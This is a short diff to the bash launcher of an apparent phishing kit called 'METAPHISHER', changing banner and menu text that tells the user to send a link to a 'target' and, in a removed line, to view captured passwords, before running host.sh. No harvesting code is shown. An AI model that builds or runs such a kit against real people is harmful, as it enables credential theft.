@@ -1,12 +1,13 @@
 #!bin/bash
 clear
-echo "METAPHISH STARTED..."
+echo "METAPHISHER STARTED..."
+echo
 echo
 echo "Tool By nerdhacker000 On Github, Made For Beginners"
 echo "---------------------------------------" 
 echo "1. Type your email and send link to target"
 echo "---------------------------------------" 
-echo "2. Type:"vpass"to view passwords
+echo "2. Send link to your target."
 echo "---------------------------------------" 
 echo "3 Go to my website for more: nerdhaka.blogspot.com" 
 sh host.sh
